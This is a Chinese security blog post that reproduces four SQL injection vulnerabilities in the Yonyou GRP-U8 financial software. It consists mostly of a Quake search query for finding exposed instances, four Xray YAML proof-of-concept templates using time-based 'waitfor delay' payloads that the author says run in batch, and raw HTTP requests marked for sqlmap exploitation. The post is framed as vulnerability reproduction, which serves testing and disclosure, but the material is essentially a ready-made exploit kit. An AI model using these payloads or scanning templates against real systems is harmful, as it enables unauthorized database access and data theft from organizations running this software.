#  【漏洞复现】用友 GRP-U8-obr_zdybxd_check等四个SQL注入漏洞   
原创 文峰SEC  文峰SEC   2025-04-04 21:12  
  
- 漏洞简介  
  
用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。用友GRP-U8存在obr_zdybxd_check等四个SQL注入漏洞。  
- 漏洞复现  
  
Quake语法：app:"用友GRP-U8"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU4YJRUHm74oSHNe8mrGRqq4z4F3zJtkFibu3I5V5o0IH6U0AG8icMicCAUA/640?wx_fmt=jpeg&from=appmsg "")  
- POC很简单，具体看Xray脚本，批量yaml文件  
  
```
name: wfsec-yongyou-GRP-U8-bx_dj_check_sqli
transport: http
rules:
  r0:
    request:
      method: GET
      path: /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1
      follow_redirects: false
    expression: response.status == 200
    output:
      undelayedLantency: response.latency
  r1:
    request:
      method: GET
      path: /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:5'--
      follow_redirects: false
    expression: response.status == 200 && response.latency - undelayedLantency >= 5 * 1000 - 500
expression: r0() && r1()
detail:
  author: wfsec
  links:
    - http://wfsec.com
```  
```
name: wfsec-yongyou-GRP-U8-listSelectDialogServlet_sqli
transport: http
rules:
  r0:
    request:
      method: GET
      path: /listSelectDialogServlet?slType=slFZX&slCdtn=1
      follow_redirects: false
    expression: response.status == 200
    output:
      undelayedLantency: response.latency
  r1:
    request:
      method: GET
      path: /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:5%27
      follow_redirects: false
    expression: response.status == 200 && response.latency - undelayedLantency >= 5 * 1000 - 500
expression: r0() && r1()
detail:
  author: wfsec
  links:
    - http://wfsec.com
```  
```
name: wfsec-yongyou-GRP-U8-obr_zdybxd_check_sqli
transport: http
rules:
  r0:
    request:
      method: GET
      path: /u8qx/obr_zdybxd_check.jsp?mlid=1
      follow_redirects: false
    expression: response.status == 200
    output:
      undelayedLantency: response.latency
  r1:
    request:
      method: GET
      path: /u8qx/obr_zdybxd_check.jsp?mlid=1';waitfor+delay+'0:0:5'--
      follow_redirects: false
    expression: response.status == 200 && response.latency - undelayedLantency >= 5 * 1000 - 500
expression: r0() && r1()
detail:
  author: wfsec
  links:
    - http://wfsec.com
```  
```
name: wfsec-yongyou-GRP-U8-dialog_moreUser_check_sqli
transport: http
rules:
  r0:
    request:
      method: GET
      path: /u8qx/dialog_moreUser_check.jsp?mlid=1
      follow_redirects: false
    expression: response.status == 200
    output:
      undelayedLantency: response.latency
  r1:
    request:
      method: GET
      path: /u8qx/dialog_moreUser_check.jsp?mlid=';waitfor+delay+'0:0:5'--
      follow_redirects: false
    expression: response.status == 200 && response.latency - undelayedLantency >= 5 * 1000 - 500
expression: r0() && r1()
detail:
  author: wfsec
  links:
    - http://wfsec.com
```  
- xray结果也很直观  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU4YxlMWcibCkHU6lCQI4ovBiaUhkXj63CAm9VHPDLTdGOhBicgNeTibiaibEtA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap payload 一一对应  
```
# 1
GET /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1* HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip
# 2
GET /u8qx/dialog_moreUser_check.jsp?mlid=* HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip
# 3
GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2* HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip
# 4
GET /u8qx/obr_zdybxd_check.jsp?mlid=* HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU42HlKMMvE20ibN5ic6gGtvnPEibosQMwgG9JYxPbmOiagwrsAXMt047r9Yg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU4NpLOiblVnUOYkbmXO3BWw9ZPONPkGsa7sqRqzNuDdrtLicj3TI58Aic4w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU4TXuMSr52kshJ12zRJjJg3OLesSDq6Aica45u2QSDxicrwvfXTNckqMsw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YhFqYGhfZqLnicSHpuiaZv66NEcvRszhU4p2iaZJzqrw3XegWud86jYTRj0zbS6R5RZIt24Uek8ZI5KTuOgSoDZUA/640?wx_fmt=png&from=appmsg "")  
  
  
